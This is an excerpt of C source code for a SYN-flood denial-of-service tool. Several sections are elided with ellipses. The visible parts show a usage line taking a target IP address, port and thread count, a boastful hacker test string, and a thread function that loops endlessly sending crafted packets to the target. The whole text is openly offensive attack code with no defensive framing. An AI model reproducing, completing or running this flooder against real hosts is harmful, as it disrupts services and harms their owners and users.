...
#define TEST_STRING "I AM THE BEST HACKER IN THE WORLD, BETTER THAN TH30 BARRE"
...
int main(int argc, char *argv[]) {
	...
	if (argc < 4) {
		printf("ERROR : ARGUMENTS MISSING ( ./syn_flooding [IP_ADDR] [PORT] [NB_THREADS]  )\n");
		return 1;
	};
...
void *spamming_thread(void *arg) {
	...
	while (1) {
		...
		//Send the packet
		if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)arg, sizeof(struct sockaddr)) == -1){
